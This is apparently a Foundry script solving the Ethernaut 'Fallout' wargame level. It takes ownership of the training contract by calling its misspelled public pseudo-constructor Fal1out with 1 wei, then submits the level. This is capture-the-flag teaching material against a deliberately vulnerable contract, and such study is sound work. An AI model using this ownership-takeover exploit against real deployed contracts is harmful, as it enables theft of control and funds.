// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.13;

import {Level} from "ethernaut/levels/base/Level.sol";
import {Vm, console, Attacker} from "../src/Attacker.sol";

abstract contract Fallout {
    mapping(address => uint256) allocations;
    address payable public owner;

    function Fal1out() public payable virtual;
    function allocate() public payable virtual;
    function sendAllocation(address payable allocator) public virtual;
    function collectAllocations() public virtual;
    function allocatorBalance(address allocator)
        public
        view
        virtual
        returns (uint256);
}

/**
 *
 * Level address: 0x676e57FdBbd8e5fE1A7A3f4Bb1296dAC880aa639
 * Claim ownership of the contract below to complete this level.
 *
 * Things that might help
 *
 * Solidity Remix IDE
 *
 */
contract FalloutScript is Attacker {
    Level private level = Level(0x676e57FdBbd8e5fE1A7A3f4Bb1296dAC880aa639);

    function run() external {
        vm.startBroadcast(me.privateKey);
        address instance = getNewLevelInstance(level);
        Fallout fallout = Fallout(instance);

        fallout.Fal1out{value: 1 wei}();
        require(me.addr == fallout.owner());
        require(submitInstance(), "Level submission failed");
        vm.stopBroadcast();
    }
}
